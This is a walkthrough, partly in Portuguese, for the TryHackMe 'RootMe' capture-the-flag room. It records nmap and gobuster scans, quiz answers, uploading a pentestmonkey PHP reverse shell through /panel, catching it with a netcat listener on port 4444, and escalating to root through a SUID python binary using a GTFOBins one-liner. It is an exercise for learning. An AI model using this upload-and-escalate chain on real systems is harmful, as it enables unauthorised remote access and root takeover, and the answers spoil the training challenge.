@@ -1,0 +1,99 @@
+https://tryhackme.com/room/rrootme
+
+nmap -sT -sV -T4 -A -vv 10.10.233.185
+
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+| ssh-rsa
+AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6ky
+RQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb
+6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMi
+phYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB+
++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GEN
+FUhzNrUfryL02/EMt5pgfj8G7ojx5
+| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+| ecdsa-sha2-nistp256
+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5Kw
+MXdhMWEbPcF5JrZzhDTVERXqFstm7WA/
+5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
+| 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+|_ssh-ed25519
+AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
+80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+| /:
+| PHPSESSID:
+|_ httponly flag not set
+| http-methods:
+|_ Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+What version of Apache is running?
+2.4.29
+
+What service is running on port 22?
+ssh
+
+Find directories on the web server using the GoBuster tool.
+
+gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
+
+/.hta (Status: 403) [Size: 278]
+/.htaccess (Status: 403) [Size: 278]
+/.htpasswd (Status: 403) [Size: 278]
+/css (Status: 301) [Size: 312] [--> http://10.10.233.185/css/]
+/index.php (Status: 200) [Size: 616]
+/js (Status: 301) [Size: 311] [--> http://10.10.233.185/js/
+/panel (Status: 301) [Size: 314] [--> http://10.10.233.185/panel/]
+/server-status Status: 403) [Size: 278]
+/uploads (Status: 301) [Size: 316] [--> http://10.10.233.185/uploads/]
+
+What is the hidden directory?
+/panel/
+
+Find a form to upload and get a reverse shell, and find the flag.
+
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+fazer as devidas mudanças
+
+1 – Mudar para o ip da sua maquina ou da vpn do thm
+2 – mudar a porta para a 4444
+
+entrar no http://<IP>/panel
+fazer o envio do arquivo
+
+ativar o nc:
+nc -lnvp 4444
+
+entrar no http://<IP>/uploads
+
+executar o arquivo
+
+procurar a flag user com o comando: 
+find | grep "user.txt"
+
+privilege scalation
+find / -type f -user root -perm -4000 2>/dev/null
+
+Search for files with SUID permission, which file is weird? - 
+/usr/bin/python
+
+encontrei arquivos que pareciam ser interessante
+/usr/bin/python
+/usr/bin/sudo
+
+pesquisei sobre get sudo python:
+
+https://gtfobins.github.io/gtfobins/python/#sudo
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+cd /root
+
+cat root.txt
+
